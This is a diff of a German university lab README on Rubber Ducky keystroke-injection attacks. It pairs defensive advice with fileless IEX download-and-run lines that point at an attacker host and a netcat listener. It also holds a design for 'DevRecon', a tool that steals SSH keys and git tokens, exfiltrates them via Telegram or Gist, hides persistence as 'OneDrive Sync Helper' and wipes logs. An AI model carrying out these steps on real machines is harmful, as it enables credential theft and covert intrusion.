@@ -1,47 +1,46 @@
-# W02a – Rubber Ducky & Bash Bunny
-**System Security Lab – SS 2026 | Universität Klagenfurt**
+# W02a – Rubber Ducky
+**System Security Lab – SS 2026 | Universitat Klagenfurt**
 **Autoren: Raphael Bleier, Joachim Lugger**
 
 ---
 
-## Dateiübersicht
+## Dateiubersicht
 
 | Datei | Aufgabe |
 |---|---|
 | `payloads/W02a1_hello_world.txt` | W02a.1 – DuckyScript: Hello World |
 | `payloads/W02a2_info_gathering.txt` | W02a.2 – DuckyScript: Information Gathering |
-| `payloads/W02a4_script_loader.txt` | W02a.4 – DuckyScript: Externes Script laden & ausführen |
-| `payloads/W02a5_reverse_shell_trigger.txt` | W02a.5 – DuckyScript: Reverse Shell triggern |
-| `payloads/W02a6_custom_attack.txt` | W02a.6 – DuckyScript: Eigener Angriff (WLAN-Exfiltration) |
-| `payloads/W02a6_devrecon_trigger.txt` | W02a.6 Advanced – **DevRecon** Trigger (fileless Stage 1) |
-| `scripts/info_gather.ps1` | W02a.2 – PowerShell Payload (wird vom Server gehostet) |
-| `scripts/reverse_shell.ps1` | W02a.5 – PowerShell Reverse Shell (wird vom Server gehostet) |
-| `scripts/custom_attack.ps1` | W02a.6 – PowerShell WLAN-Exfiltration Payload |
-| `scripts/developer_recon.ps1` | W02a.6 Advanced – **DevRecon** Multi-Stage Payload (Stage 2) |
-| `server/server.py` | W02a.2/4/5/6 – Lokaler HTTP-Server (Angreifer-Seite) |
+| `payloads/W02a4_script_loader.txt` | W02a.4 – DuckyScript: Externes Script laden |
+| `payloads/W02a5_reverse_shell_trigger.txt` | W02a.5 – DuckyScript: Reverse Shell |
+| `payloads/W02a6_custom_attack.txt` | W02a.6 – DuckyScript: WLAN-Exfiltration |
+| `payloads/W02a6_devrecon_trigger.txt` | W02a.6 Advanced – DuckyScript: DevRecon |
+| `scripts/info_gather.ps1` | W02a.2 – PowerShell: System-Info via Telegram |
+| `scripts/reverse_shell.ps1` | W02a.5 – PowerShell: TCP Reverse Shell |
+| `scripts/custom_attack.ps1` | W02a.6 – PowerShell: WLAN-Passworter via Telegram |
+| `scripts/developer_recon.ps1` | W02a.6 Advanced – PowerShell: DevRecon Multi-Stage |
 
 ---
 
-## Vorbereitung & Setup
+## Setup & Vorbereitung
 
-### 1. Server starten (Angreifer-Maschine)
-```bash
-# Im server/-Verzeichnis: PayloadScripte und server.py liegen zusammen
-cd server/
-# PS-Payloads ins Server-Verzeichnis kopieren damit sie via GET abrufbar sind
-cp ../scripts/reverse_shell.ps1 payload.ps1
-python3 server.py 8080
-```
+### Rubber Ducky konfigurieren
 
-### 2. IP-Adresse eintragen
-In allen DuckyScript-Dateien `ATTACKER_IP` durch die echte IP-Adresse ersetzen (z.B. `192.168.1.100`).
-
-### 3. Rubber Ducky konfigurieren
-1. Script in [PayloadStudio](https://payloadstudio.hak5.org) öffnen
-2. Unter **Settings → Compiler Settings → Language**: `de` (de.json) setzen
+1. Payload in [PayloadStudio](https://payloadstudio.hak5.org) offnen
+2. **Settings → Compiler Settings → Language → `de`** setzen (Y/Z-Layout!)
 3. Kompilieren → `inject.bin` auf SD-Karte kopieren
 
-### 4. Für W02a.5 – Listener starten
+Alle Payloads (ausser W02a.5) sind **direkt einsatzbereit** – kein lokaler Server, keine IP-Konfiguration.
+Die PowerShell-Scripts werden automatisch von GitHub nachgeladen; Ergebnisse kommen per Telegram.
+
+### Nur fur W02a.5 – Reverse Shell: IP eintragen
+
+```powershell
+# scripts/reverse_shell.ps1
+$ATTACKER_IP = "192.168.x.x"   # eigene IP eintragen
+$PORT        = 4444
+```
+
+Committen & pushen. Dann Listener starten:
 ```bash
 nc -lvp 4444
 ```
@@ -52,38 +51,36 @@ nc -lvp 4444
 
 **Payload:** `payloads/W02a1_hello_world.txt`
 
-Öffnet Notepad über den Windows Run-Dialog (`WIN+R`) und tippt `Hello World` ein.
+Offnet Notepad uber den Windows Run-Dialog (`WIN+R`) und tippt `Hello World` ein.
 
-**Ergebnis:** Notepad mit dem Text "Hello World" öffnet sich auf dem Zielrechner innerhalb von ~3 Sekunden nach Einstecken des Rubber Ducky.
+**Ergebnis:** Notepad mit dem Text "Hello World" erscheint auf dem Zielrechner in ~3 Sekunden.
 
 ---
 
 ## W02a.2 – Rubber Ducky: Information Gathering
 
 **Payload:** `payloads/W02a2_info_gathering.txt`
-**Server:** `server/server.py`
 **PS-Payload:** `scripts/info_gather.ps1`
 
+Das DuckyScript offnet PowerShell verborgen und ladt `info_gather.ps1` fileless von GitHub (IEX + DownloadString).
+
 Gesammelte Informationen:
-- Hostname, Benutzername, Domäne
+- Hostname, Benutzername, Domane
 - Betriebssystem, Architektur
-- IPv4-Adressen (alle aktiven Interfaces)
-- Gespeicherte WLAN-Profilnamen (`netsh wlan show profiles`)
+- IPv4-Adressen aller aktiven Interfaces
+- Gespeicherte WLAN-Profilnamen
 
-Die Daten werden per HTTP POST an den Angreifer-Server gesendet und in `server/loot/` gespeichert.
+Ergebnis kommt als `.txt`-Datei per Telegram.
 
-**CLI-Kommandos für Systeminformationen (Windows):**
+**Relevante Windows-Kommandos:**
 ```powershell
-hostname                                      # Computername
-whoami                                        # Aktueller Benutzer
-(Get-WmiObject Win32_OperatingSystem).Caption # OS-Version
-Get-NetIPAddress -AddressFamily IPv4          # IP-Adressen
-netsh wlan show profiles                      # WLAN-Profile
-ipconfig /all                                 # Alle Netzwerk-Adapter
+hostname
+whoami
+(Get-CimInstance Win32_OperatingSystem).Caption
+Get-NetIPAddress -AddressFamily IPv4
+netsh wlan show profiles
+ipconfig /all
 ```
-
-**Übertragung per Netzwerk:**
-`Invoke-WebRequest` (PowerShell) bzw. `curl` sendet die Daten als HTTP POST Body an den lokalen Python-Server.
 
 ---
 
@@ -91,206 +88,270 @@ ipconfig /all                                 # Alle Netzwerk-Adapter
 
 ### Was sind HID-Angriffe?
 
-HID steht für **Human Interface Device** – der USB-Standard für Eingabegeräte wie Tastaturen und Mäuse. Das Betriebssystem vertraut HID-Geräten automatisch und ohne Authentifizierung. Ein HID-Angriff nutzt dieses Vertrauen aus, indem ein speziell präpariertes Gerät (z.B. Rubber Ducky) als legitime Tastatur erkannt wird und dann mit Maschinengeschwindigkeit vorab programmierte Tastatureingaben an das Zielsystem sendet.
+HID steht fur **Human Interface Device** – der USB-Standard fur Eingabegerate wie Tastaturen und Mause. Das Betriebssystem vertraut HID-Geraten automatisch und ohne Authentifizierung. Ein HID-Angriff nutzt dieses Vertrauen aus, indem ein speziell prapiertes Gerat (z.B. Rubber Ducky) als legitime Tastatur erkannt wird und mit Maschinengeschwindigkeit vorprogrammierte Tastatureingaben an das Zielsystem sendet.
 
-Das Kernproblem: **Das OS unterscheidet nicht zwischen einem echten Benutzer an der Tastatur und einem programmierten HID-Gerät.**
+**Das Kernproblem:** Das OS unterscheidet nicht zwischen einem echten Benutzer an der Tastatur und einem programmierten HID-Gerat.
 
-### Warum können HID-Angriffe gefährlich werden?
+### Warum konnen HID-Angriffe gefahrlich werden?
 
-1. **Kein Vertrauensproblem auf OS-Ebene:** Tastaturen werden ohne Treiberinstallation oder Berechtigungsabfrage akzeptiert – auch auf gesperrten Computern.
-2. **Geschwindigkeit:** Ein Rubber Ducky tippt hunderte Zeichen pro Sekunde. Ein vollständiger Angriff kann in unter 10 Sekunden abgeschlossen sein.
-3. **Kein Malware-Fingerabdruck:** Antivirenprogramme erkennen keine schädliche Datei, weil der Angriff nur Tastatureingaben injiziert – die vorhandenen Systemmittel (PowerShell, cmd) werden genutzt.
+1. **Kein Vertrauensproblem auf OS-Ebene:** Tastaturen werden ohne Treiberinstallation oder Berechtigungsabfrage akzeptiert.
+2. **Geschwindigkeit:** Ein Rubber Ducky tippt hunderte Zeichen pro Sekunde. Ein vollstandiger Angriff kann in unter 10 Sekunden abgeschlossen sein.
+3. **Kein Malware-Fingerabdruck:** Antivirenprogramme erkennen keine schadliche Datei, weil nur Tastatureingaben injiziert werden – vorhandene Systemmittel (PowerShell, cmd) werden genutzt.
 4. **Universell:** Funktioniert auf Windows, Linux und macOS mit minimalen Anpassungen.
-5. **Physischer Zugang reicht:** Kurzzeitiger unbeaufsichtigter Zugang (z.B. Büro, Konferenz, Kantine) genügt.
+5. **Physischer Zugang reicht:** Kurzzeitiger unbeaufsichtigter Zugang genugt.
 
-### Welche Arten von HID-Angriffen gibt es?
+### Arten von HID-Angriffen
 
 | Angriff | Beschreibung |
 |---|---|
 | **Keystroke Injection** | Direktes Eintippen von Befehlen (Rubber Ducky, O.MG Cable) |
-| **BadUSB** | Modifizierte USB-Firmware täuscht verschiedene Geräteklassen vor |
+| **BadUSB** | Modifizierte USB-Firmware tauscht verschiedene Gerateklassen vor |
 | **Bash Bunny** | Kombiniert HID mit Netzwerk-Adapter und Mass Storage |
-| **Mousejack** | Drahtlose HID-Angriffe über unverschlüsselte 2,4-GHz-Protokolle |
-| **BLE HID** | Bluetooth Low Energy HID-Spoofing |
-| **Flipper Zero BadUSB** | Portable Variante mit DuckyScript-Unterstützung |
-| **USB Keyboard Spoofing** | Android/Linux-Gerät gibt sich als Tastatur aus |
+| **Mousejack** | Drahtlose HID-Angriffe uber unverschlusselte 2,4-GHz-Protokolle |
+| **Flipper Zero BadUSB** | Portable Variante mit DuckyScript-Unterstutzung |
 
-### Was würden wir Personen raten, die sich schützen wollen?
+### Schutzempfehlungen
 
-**Verhaltensmaßnahmen:**
-- Unbekannte USB-Geräte niemals einstecken (auch nicht vermeintlich eigene)
-- Computer beim Verlassen des Platzes immer sperren (`WIN+L`)
-- Keine Fundgeräte anschließen (USB-Drop-Angriff)
+**Verhaltensmasnahmen:**
+- Unbekannte USB-Gerate niemals einstecken
+- Computer beim Verlassen immer sperren (`WIN+L`)
+- Keine Fundgerate anschliessen (USB-Drop-Angriff)
 
-**Technische Maßnahmen (nächste Aufgabe W02a.7 – hier bereits vorab):**
+**Technische Masnahmen** (Details unter W02a.7):
 - USB-Port-Sperren per Gruppenrichtlinie (GPO)
-- USBGuard (Linux) – Whitelist erlaubter Geräte per Vendor/Product-ID
-- Endpoint Detection & Response (EDR) mit HID-Anomalieerkennung
-- Rapid keystroke detection (unnatürliche Eingabegeschwindigkeit erkennen)
+- USBGuard (Linux)
+- EDR mit HID-Anomalieerkennung
 
 ---
 
-## W02a.4 – Rubber Ducky: Externes Script laden & ausführen
+## W02a.4 – Rubber Ducky: Externes Script laden & ausfuhren
 
 **Payload:** `payloads/W02a4_script_loader.txt`
 
-Das DuckyScript öffnet PowerShell und nutzt `Invoke-Expression` + `New-Object Net.WebClient` um ein Script direkt vom Angreifer-Server herunterzuladen und **ohne Zwischenspeicherung auf der Festplatte** auszuführen (fileless execution). Der Vorteil: Es existiert keine Datei auf dem Zielrechner, die von AV erkannt werden könnte.
+Das DuckyScript offnet PowerShell und nutzt `Invoke-Expression` + `New-Object Net.WebClient` um ein Script direkt von GitHub herunterzuladen und **ohne Zwischenspeicherung auf der Festplatte** auszufuhren (fileless execution).
 
-**Ablauf:**
 ```
 Rubber Ducky eingesteckt
-  → WIN+R → PowerShell -ep bypass
-  → WebClient.DownloadString('http://ATTACKER_IP:8080/payload.ps1')
-  → IEX (Invoke-Expression) führt Script sofort aus
+  -> WIN+R -> powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+  -> IEX (DownloadString('https://raw.githubusercontent.com/.../info_gather.ps1'))
+  -> Script lauft im RAM, keine Datei auf Festplatte
 ```
+
+Kein AV-Scanner findet eine Datei, weil keine existiert.
 
 ---
 
 ## W02a.5 – Rubber Ducky: Reverse Shell
 
 **Payload:** `payloads/W02a5_reverse_shell_trigger.txt`
-**PS-Payload:** `scripts/reverse_shell.ps1` (als `payload.ps1` auf Server hosten)
+**PS-Payload:** `scripts/reverse_shell.ps1`
 
 ### Wie funktioniert eine Reverse Shell?
 
-Bei einer regulären Shell verbindet sich der **Angreifer → Opfer** (eingehende Verbindung, blockiert von Firewalls).
-
-Bei einer **Reverse Shell** verbindet sich das **Opfer → Angreifer** (ausgehende Verbindung):
+Bei einer regularen Shell verbindet sich Angreifer → Opfer (eingehend, von Firewalls geblockt).
+Bei einer Reverse Shell verbindet sich das Opfer → Angreifer (ausgehend, typischerweise erlaubt):
 
 ```
-Angreifer-Maschine          Opfer-Maschine
-nc -lvp 4444   ←←←←←  TCP-Verbindung  ←←←←  reverse_shell.ps1
-(wartet)                                       (läuft versteckt)
-        ↕ Interaktive Shell ↕
+Angreifer-Maschine           Opfer-Maschine
+nc -lvp 4444  <---------  TCP-Verbindung  <----  reverse_shell.ps1
+(wartet)                                          (lauft versteckt)
+      |          Interaktive Shell          |
 ```
-
-Das Opfer-System baut die Verbindung aktiv auf. Ausgehende Verbindungen werden von Firewalls meist erlaubt → Reverse Shells umgehen so typische Firewall-Regeln.
 
 ### Voraussetzungen
 
-1. **Listener auf Angreifer-Seite:** `nc -lvp 4444` (oder Metasploit `multi/handler`)
-2. **Netzwerk-Erreichbarkeit:** Opfer muss den Angreifer-Host über das Netzwerk erreichen können (gleiche LAN-Segment oder Internet)
-3. **Ausführungsrechte:** Das PS-Script muss auf dem Opfer-System ausgeführt werden dürfen (daher `-ExecutionPolicy Bypass`)
-4. **Firewall-Ausnahme:** Ausgehende Verbindung auf Port 4444 darf nicht geblockt sein
+1. `nc -lvp 4444` auf Angreifer-Maschine starten
+2. `$ATTACKER_IP` und `$PORT` in `reverse_shell.ps1` eintragen, committen, pushen
+3. Opfer muss den Angreifer-Host uber das Netz erreichen konnen
 
-### Wie könnte eine Reverse Shell verhindert/entdeckt werden?
+### Erkennung & Gegenmasnahmen
 
 | Methode | Beschreibung |
 |---|---|
-| **Ausgehende Firewall-Regeln** | Nur bekannte Ports (80, 443) erlauben; unbekannte Ports blockieren |
-| **IDS/IPS** | Erkennt ungewöhnliche ausgehende Verbindungen anhand von Signaturen |
-| **EDR/Antivirus** | Erkennt bekannte Reverse-Shell-Muster in PS-Scriptausführung |
-| **PowerShell Logging** | Script Block Logging (`HKLM:\...\PowerShell\ScriptBlockLogging`) aufzeichnen und auswerten |
-| **AMSI** | Anti-Malware Scan Interface – prüft PS-Code vor Ausführung |
-| **Netzwerk-Monitoring** | Ungewöhnliche ausgehende Verbindungen (neue Ziel-IP, ungewöhnlicher Port) |
-| **Least Privilege** | Benutzer ohne Admin-Rechte – eingeschränkte PS-Ausführung |
+| **Ausgehende Firewall-Regeln** | Nur bekannte Ports (80, 443) erlauben |
+| **IDS/IPS** | Erkennt ungewohnliche ausgehende Verbindungen |
+| **EDR/Antivirus** | Erkennt bekannte Reverse-Shell-Muster in PS |
+| **PS Script Block Logging** | Alle ausgefuhrten PS-Blocke protokollieren |
+| **AMSI** | Anti-Malware Scan Interface pruft PS-Code vor Ausfuhrung |
+| **Netzwerk-Monitoring** | Neue Ziel-IP auf ungewohnlichem Port |
 
 ---
 
-## W02a.6 – Rubber Ducky: Eigener Angriff
+## W02a.6 – Rubber Ducky: WLAN-Passwort-Exfiltration
 
 **Payload:** `payloads/W02a6_custom_attack.txt`
 **PS-Payload:** `scripts/custom_attack.ps1`
 
-### Ziel
-Gespeicherte WLAN-Passwörter des Zielsystems exfiltrieren.
-
 ### Vorgehensweise
-1. Rubber Ducky öffnet minimiertes CMD-Fenster
-2. Wechselt ins `%TEMP%`-Verzeichnis
-3. `netsh wlan export profile key=clear` exportiert alle WLAN-Profile als XML mit **Klartextpasswörtern** (Windows erlaubt dies mit regulären Benutzerrechten!)
-4. PowerShell extrahiert `<keyMaterial>`-Tags (= Passwörter) aus den XMLs
-5. Liste wird per HTTP POST exfiltriert
-6. XMLs und Hilfsdateien werden gelöscht
 
-### Warum ist das besonders gefährlich?
-`netsh wlan export profile key=clear` benötigt **keine Administrator-Rechte** und gibt alle gespeicherten WLAN-Passwörter im Klartext aus. Das ist ein bekanntes Windows-Feature, das regelmäßig für Credential Dumping genutzt wird.
+1. Rubber Ducky offnet PowerShell im Hidden-Modus
+2. `netsh wlan export profile key=clear folder="%TEMP%"` exportiert alle WLAN-Profile als XML mit **Klartextpasswortern** ins TEMP-Verzeichnis
+3. PowerShell parst die XMLs und extrahiert SSID + Passwort
+4. Ergebnisliste kommt als `.txt`-Datei per Telegram
+5. Exportierte XMLs werden geloscht
 
-### Ablauf (zeitlich)
+**Warum gefahrlich:** `netsh wlan export profile key=clear` benotigt **keine Administrator-Rechte** und liefert alle gespeicherten WLAN-Passworter im Klartext. Standardfeature von Windows.
+
+### Zeitlicher Ablauf
+
 | Zeit | Aktion |
 |---|---|
 | 0s | Rubber Ducky eingesteckt |
-| 2s | CMD geöffnet |
-| 3s | WLAN-Export läuft |
-| 4,5s | Passwörter extrahiert |
-| 6s | Daten exfiltriert |
-| 7,5s | Spuren verwischt, Fenster geschlossen |
+| 2s | PowerShell gestartet (verborgen) |
+| 3s | WLAN-Export ins TEMP-Verzeichnis |
+| 5s | Passworter extrahiert & per Telegram versendet |
+| 6s | XML-Dateien geloscht |
 
 ---
 
-## W02a.7 – Ideen zur Absicherung gegen Rubber Ducky
+## W02a.7 – Absicherung gegen Rubber Ducky
 
-Gefragt sind **technische** Methoden abseits von Awareness und Benutzerverhalten.
+### 1. USB-Gerate-Whitelisting per GPO
 
-### 1. USB-Geräte-Whitelisting per Gruppenrichtlinie (GPO)
-
-Windows erlaubt es, USB-Geräte anhand von **Vendor ID (VID) und Product ID (PID)** zu sperren oder nur bekannte Geräte zuzulassen:
+Windows erlaubt Sperren per Vendor ID (VID) und Product ID (PID):
 
 ```
-Computerkonfiguration → Administrative Vorlagen
-  → System → Wechselmediumzugriff
-  → "Wechselmedien: Alle Klassen verweigern" = Aktiviert
+Computerkonfiguration -> Administrative Vorlagen
+  -> System -> Wechselmediumzugriff
+  -> "Wechselmedien: Alle Klassen verweigern" = Aktiviert
 ```
 
-Oder gezielt für HID (Klassen-GUID `{745a17a0-74d3-11d0-b6fe-00a0c90f57da}`):
+Oder gezielt fur HID (Klassen-GUID `{745a17a0-74d3-11d0-b6fe-00a0c90f57da}`):
 ```
-Computerkonfiguration → Administrative Vorlagen → System → Geräteinstallation
-  → Geräteinstallation nach Geräteklassen-GUIDs einschränken
+Computerkonfiguration -> Administrative Vorlagen -> System -> Geratekonfiguration
+  -> Gerate-Installation nach Gerateinstallations-GUIDs einschranken
 ```
 
 ### 2. USBGuard (Linux)
 
-Whitelist-basiertes Tool, das neue USB-Geräte blockiert bis sie explizit freigegeben werden:
+Whitelist-basiert – neue USB-Gerate werden blockiert bis explizit freigegeben:
 ```bash
 usbguard generate-policy > /etc/usbguard/rules.conf
 usbguard enforce-policy
-# Neue Geräte müssen per 'usbguard allow-device' genehmigt werden
 ```
 
 ### 3. Rapid Keystroke Detection
 
-Der Rubber Ducky tippt mit ~1000 Zeichen/Sekunde – weit über menschliche Möglichkeiten. Eine Software, die die Tastatureingabegeschwindigkeit überwacht, kann HID-Angriffe erkennen und blockieren:
-
-- **Windows:** Tools wie *KeyScrambler* oder custom EDR-Regeln
-- **Endpunkt-Monitoring:** Alerting bei >X Tastendrücken/Sekunde von einem neuen HID-Gerät
+Rubber Ducky tippt ~1000 Zeichen/Sekunde – weit uber menschliche Moglichkeiten. Software die Tastatureingabegeschwindigkeit uberwacht kann HID-Angriffe erkennen und blockieren.
 
 ### 4. Endpoint Detection & Response (EDR)
 
-Moderne EDR-Lösungen (z.B. Trellix, CrowdStrike, Microsoft Defender for Endpoint) erkennen:
-- Ungewöhnliche Prozessaufrufe direkt nach USB-Verbindung
+Moderne EDR-Losungen erkennen:
+- Ungewohnliche Prozessaufrufe direkt nach USB-Verbindung
 - PowerShell mit `-ExecutionPolicy Bypass` und `Invoke-Expression`
-- Netzwerkverbindungen aus PowerShell-Prozessen (`IEX`-basierte Downloads)
+- Netzwerkverbindungen aus PowerShell-Prozessen
 
 ### 5. Physische USB-Port-Sperren
 
-Physische Kunststoff-Stecker, die in freie USB-Ports eingesteckt werden und sich nur mit Spezialwerkzeug entfernen lassen (z.B. USB Port Blocker von Lindy). Verhindert das physische Einstecken des Rubber Ducky.
+Physische Kunststoff-Stecker in freie USB-Ports, die sich nur mit Spezialwerkzeug entfernen lassen. Verhindert das physische Einstecken.
 
 ### 6. BIOS/UEFI-Konfiguration
 
-- USB-Ports im BIOS deaktivieren (außer für Maus/Tastatur an bestimmten Ports)
-- Secure Boot aktivieren – verhindert Ausführung unsignierter USB-Bootmedien
-- BIOS-Passwort setzen – verhindert Änderung der Einstellungen
+- USB-Ports im BIOS deaktivieren (ausser Maus/Tastatur)
+- Secure Boot aktivieren
+- BIOS-Passwort setzen
 
-### 7. Windows Defender Application Control (WDAC) / AppLocker
+### 7. WDAC / AppLocker
 
-Verhindert, dass neue/unbekannte Prozesse gestartet werden. Blockiert z.B. den Download und die Ausführung von Payloads per PowerShell, wenn die Signaturen nicht bekannt sind.
+Verhindert Ausfuhrung unbekannter Prozesse. Blockiert z.B. ungezieltes `IEX`-basiertes Nachladen von externen Payloads.
 
 ### Vergleich der Methoden
 
 | Methode | Aufwand | Schutzlevel | Seiteneffekte |
 |---|---|---|---|
-| GPO USB-Whitelist | Mittel | Hoch | Neue Geräte müssen freigegeben werden |
-| USBGuard (Linux) | Gering | Hoch | Workflow-Anpassung nötig |
-| Keystroke Detection | Hoch | Mittel | False Positives möglich |
+| GPO USB-Whitelist | Mittel | Hoch | Neue Gerate mussen freigegeben werden |
+| USBGuard (Linux) | Gering | Hoch | Workflow-Anpassung notig |
+| Keystroke Detection | Hoch | Mittel | False Positives moglich |
 | EDR | Mittel (Lizenz) | Hoch | Systemressourcen |
-| Physische Sperren | Gering | Sehr hoch (physisch) | Flexibilität eingeschränkt |
-| BIOS-Deaktivierung | Gering | Sehr hoch | Stark eingeschränkte USB-Nutzung |
+| Physische Sperren | Gering | Sehr hoch | Flexibilitat eingeschrankt |
+| BIOS-Deaktivierung | Gering | Sehr hoch | Stark eingeschrankte USB-Nutzung |
+
+---
+
+## W02a.6 Advanced – "DevRecon" – Developer Credential Harvester
+
+> Eigener kreativer Angriff: kombiniert Stealth, Living-off-the-Land, gezieltes Credential-Harvesting und automatische Persistenz.
+
+**Dateien:**
+- `payloads/W02a6_devrecon_trigger.txt` – Stage 1: DuckyScript (Trigger)
+- `scripts/developer_recon.ps1` – Stage 2: PowerShell Multi-Stage Payload
+
+### Angriffsziel
+
+Entwickler-Maschinen enthalten haufig:
+- **SSH Private Keys** (`~/.ssh/id_rsa`, `id_ed25519`) → direkter Zugang zu Servern
+- **`.git-credentials`** → GitHub/GitLab OAuth-Tokens im **Klartext** (Windows-Standard)
+- **GitHub CLI Token** (`hosts.yml`) → vollstandiger API-Zugriff auf alle Repos
+- **`.gitconfig`** → Name, E-Mail, konfigurierter Credential Helper
+
+Ein einziger GitHub-Token kann tausende private Repositories, CI/CD-Pipelines und Produktionsdeploys kompromittieren.
+
+### Angriffs-Architektur
+
+```
+[Rubber Ducky eingesteckt]
+        |
+        v  ~2 Sekunden
+[Stage 1: DuckyScript]
+  WIN+R -> PowerShell -WindowStyle Hidden
+  IEX (DownloadString von GitHub)
+        |
+        v  fileless – kein Byte auf Festplatte
+[Stage 2: developer_recon.ps1]
+        |
+        +-> RECON:   SSH Keys + .git-credentials + .gitconfig + GitHub CLI Token
+        |
+        +-> EXFIL:   Telegram Bot (HTTPS Port 443)
+        |
+        +-> PERSIST: Scheduled Task "OneDrive Sync Helper"
+        |            Wochentlich, versteckt, kein Admin notig
+        |            Ladt sich selbst von GitHub nach
+        |
+        +-> OPSEC:   PS-History loschen, Recent Files leeren, Temp aufraeumen
+```
+
+### Exfiltrations-Kanal: Telegram Bot
+
+| Eigenschaft | Vorteil |
+|---|---|
+| Traffic zu `api.telegram.org:443` | HTTPS, uberall erlaubt |
+| Kein eigener Server | Keine verdachtige IP, keine Infrastruktur |
+| Kein Token auf Opfer-Seite notig | Bot-Token ist im Script – Opfer sieht ihn nicht |
+| Datei-Upload per `sendDocument` | Grosse Ergebnisdateien moglich |
+
+### Phasen im Detail
+
+**Phase 1 – Recon:** Liest SSH-Keys, `.git-credentials`, `.gitconfig` und GitHub CLI `hosts.yml` aus.
+Nutzt nur Windows-Bordmittel (`Get-Content`, `Test-Path`, `cmdkey`).
+
+**Phase 2 – Exfil:** Sendet alles als `.txt`-Datei per Telegram `sendDocument`.
+
+**Phase 3 – Persistenz:** Legt Scheduled Task "OneDrive Sync Helper" an (kein Admin notig).
+Task ladt das Script wochentlich direkt von GitHub nach – selbst-aktualisierend.
+
+**Phase 4 – OPSEC:**
+- PS-History-Datei geloscht
+- In-Memory-History geleert (falls interaktive Session)
+- `%APPDATA%\Microsoft\Windows\Recent\*` geloscht
+- Temp-XML-Dateien geloscht
+- Windows PowerShell Event Log geleert (erfordert Admin – scheitert bei normalem User still)
+
+### Gegen welche Abwehrmassnahmen ist DevRecon resistent?
+
+| Abwehr | Resistent? | Warum |
+|---|---|---|
+| Antivirus (Signatur-basiert) | Ja | Kein Binary, nur PS + Windows-Bordmittel |
+| Firewall (eingehend) | Ja | Keine eingehende Verbindung notig |
+| Firewall (ausgehend) | Ja | HTTPS Port 443 zu Telegram – uberall erlaubt |
+| EDR (Verhaltens-basiert) | Teilweise | Konnte `IEX` + `-ep Bypass` flaggen |
+| PS Script Block Logging | Teilweise | Logs werden nach Ausfuhrung geleert |
+| Netzwerk-Monitoring | Ja | Normaler HTTPS-Traffic |
 
 ---
 
 ## Erfahrungen & Beobachtungen im Labor
 
-*(Dieser Abschnitt ist während der Laborübung auszufüllen)*
+*(Wahrend der Laborubung ausfullen)*
 
 | Aufgabe | Funktioniert? | Zeitbedarf | Anmerkungen |
 |---|---|---|---|
@@ -302,97 +363,6 @@ Verhindert, dass neue/unbekannte Prozesse gestartet werden. Blockiert z.B. den D
 | W02a.6 DevRecon | | | |
 
 **Allgemeine Feststellungen:**
-- Trellix Endpoint Security: Hat während der Übungen angeschlagen? (Ja/Nein)
-- Sprachprobleme (Y/Z): Wurden die Compiler-Settings auf `de` gesetzt?
-- Netzwerk-Erreichbarkeit: War der Python-Server im Labor-LAN erreichbar?
-
----
-
-## W02a.6 Advanced – "DevRecon" – Multi-Stage Developer Credential Harvester
-
-> Eigener kreativer Angriff: Kombiniert Stealth, Living-off-the-Land, kreatives Angriffsziel und Persistenz in einem vollautomatischen Multi-Stage-Angriff.
-
-**Dateien:**
-- `payloads/W02a6_devrecon_trigger.txt` – Stage 1: DuckyScript
-- `scripts/developer_recon.ps1` – Stage 2: PowerShell Payload
-
-### Angriffsziel
-
-Entwickler-Maschinen sind ein besonders lohnendes Ziel, weil sie oft folgendes enthalten:
-- **SSH Private Keys** (`~/.ssh/id_rsa`, `id_ed25519`, ...) → direkter Zugang zu Servern
-- **`.git-credentials`** → GitHub/GitLab OAuth-Tokens im **Klartext** (Windows speichert sie so standardmäßig)
-- **GitHub CLI Token** (`hosts.yml`) → vollständiger API-Zugriff auf alle Repos des Opfers
-- **`.gitconfig`** → Name, E-Mail, konfigurierter Credential Helper
-
-Ein einziger GitHub-Token kann tausende private Repositories, CI/CD-Pipelines und Produktionsdeploys kompromittieren.
-
-### Angriffs-Architektur
-
-```
-[Rubber Ducky eingesteckt]
-        │
-        ▼  ~2 Sekunden
-[Stage 1: DuckyScript]
-  WIN+R → PowerShell -WindowStyle Hidden
-  IEX (DownloadString 'http://ATTACKER/payload.ps1')
-        │
-        ▼  fileless – kein Byte auf Festplatte
-[Stage 2: developer_recon.ps1]
-        │
-        ├─► RECON: SSH Keys + .git-credentials + .gitconfig + gh-Token
-        │
-        ├─► EXFIL: Privates GitHub Gist (HTTPS → api.github.com:443)
-        │          User-Agent: "git/2.40.0" → sieht aus wie normaler git push
-        │
-        ├─► PERSIST: Scheduled Task "OneDrive Sync Helper"
-        │            Wöchentlich, versteckt, kein Admin nötig
-        │
-        └─► OPSEC: PS-History löschen, Recent Files clearen, Temp aufräumen
-```
-
-### Warum GitHub Gist als Exfil-Kanal?
-
-| Eigenschaft | Vorteil |
-|---|---|
-| Traffic zu `api.github.com:443` | Überall erlaubt – GitHub ist auf keiner Blocklist |
-| HTTPS | Verschlüsselt, kein MitM durch Netzwerk-Monitoring |
-| Privates Gist | Nur Angreifer mit PAT kann die Daten sehen |
-| User-Agent `git/2.40.0` | Tarnung als normaler git-Client im Netzwerk-Log |
-| Keine eigene Infrastruktur | Kein C2-Server nötig, keine verdächtige IP |
-
-### Voraussetzung (Angreifer-Seite)
-
-```bash
-# 1. GitHub Personal Access Token mit "gist"-Scope erstellen:
-#    github.com → Settings → Developer Settings → Personal Access Tokens → New Token
-#    Scope: gist
-
-# 2. PAT in developer_recon.ps1 eintragen:
-$GITHUB_PAT = "ghp_XXXXXXXXXXXXXXXXXXXX"
-
-# 3. Script als payload.ps1 auf dem Python-Server hosten:
-cp scripts/developer_recon.ps1 server/payload.ps1
-python3 server/server.py 8080
-```
-
-### OPSEC-Maßnahmen im Detail
-
-| Maßnahme | Umsetzung |
-|---|---|
-| Fileless Execution | IEX lädt Payload direkt in RAM, keine Datei geschrieben |
-| Verstecktes Fenster | `-WindowStyle Hidden -NonInteractive` |
-| PS-History löschen | PSReadLine-Datei + In-Memory-History geleert |
-| Recent Files clearen | `%APPDATA%\Microsoft\Windows\Recent\*` gelöscht |
-| Scheduled Task getarnt | Name: "OneDrive Sync Helper", `Hidden = $true` |
-| User-Agent Spoofing | HTTP-Header imitiert normalen git-Client |
-
-### Gegen welche Abwehrmaßnahmen ist DevRecon resistent?
-
-| Abwehr | Resistent? | Warum |
-|---|---|---|
-| Antivirus (Signatur-basiert) | ✓ | Kein Binary, nur PS + Windows-Bordmittel |
-| Firewall (eingehend) | ✓ | Keine eingehende Verbindung nötig |
